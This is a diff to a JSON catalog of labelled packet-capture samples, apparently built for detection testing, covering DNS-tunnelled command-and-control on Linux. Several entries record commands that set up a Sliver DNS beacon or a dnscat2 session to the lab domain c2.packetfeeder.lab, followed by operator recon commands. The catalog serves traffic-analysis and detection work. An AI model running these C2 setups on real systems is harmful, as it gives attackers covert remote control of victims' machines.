@@ -42,7 +42,7 @@
           "53",
           "critical"
         ],
-        "command": "# server: sliver-server then `dns --domains exfil.packetfeeder.lab`\n# implant: generate beacon --dns exfil.packetfeeder.lab. --os linux --arch amd64\n# target: ./sliver_implant"
+        "command": "# server: sliver-server then `dns --domains c2.packetfeeder.lab`\n# implant: generate beacon --dns c2.packetfeeder.lab. --os linux --arch amd64\n# target: ./sliver_implant"
       },
       {
         "id": "t1071.004-internal-dns-c2-session-linux-sliver",
@@ -70,7 +70,36 @@
           "53",
           "critical"
         ],
-        "command": "# server: sliver-server then `dns --domains exfil.packetfeeder.lab`\n# implant: generate --dns exfil.packetfeeder.lab. --os linux --arch amd64\n# target: ./sliver_implant\n# operator (sliver client): use <session>; execute whoami; execute hostname; execute uname -a; execute id; execute ps aux"
+        "command": "# server: sliver-server then `dns --domains c2.packetfeeder.lab`\n# implant: generate --dns c2.packetfeeder.lab. --os linux --arch amd64\n# target: ./sliver_implant\n# operator (sliver client): use <session>; execute whoami; execute hostname; execute uname -a; execute id; execute ps aux"
+      },
+      {
+        "id": "t1071.004-internal-dns-c2-session-linux-dnscat2",
+        "file": "pcaps/techniques/t1071.004/t1071.004_internal_dns_c2_session_linux__dnscat2.pcap",
+        "name": "Internal DNS C2 interactive session Linux - dnscat2",
+        "description": "Internal C2 traffic from a Linux dnscat2 client operating in interactive session mode over DNS, showing sustained bidirectional encrypted command/response traffic (Salsa20, symmetric session key derived via DH) tunneled inside DNS query/response labels for the c2.packetfeeder.lab zone. Reconnaissance commands (whoami, id, hostname, uname -a, ps aux) executed from the operator console.",
+        "criticality": "critical",
+        "scope": {
+          "protocol": "udp",
+          "ports": [53]
+        },
+        "filter": [
+          "internal",
+          "dns",
+          "c2",
+          "command-and-control",
+          "session",
+          "interactive",
+          "tunnel",
+          "encrypted",
+          "linux",
+          "dnscat2",
+          "implant",
+          "recon",
+          "udp",
+          "53",
+          "critical"
+        ],
+        "command": "# server: sudo ruby dnscat2.rb c2.packetfeeder.lab\n# client (target): ./dnscat2 c2.packetfeeder.lab\n# operator (server console): whoami; id; hostname; uname -a; ps aux"
       }
     ]
   },
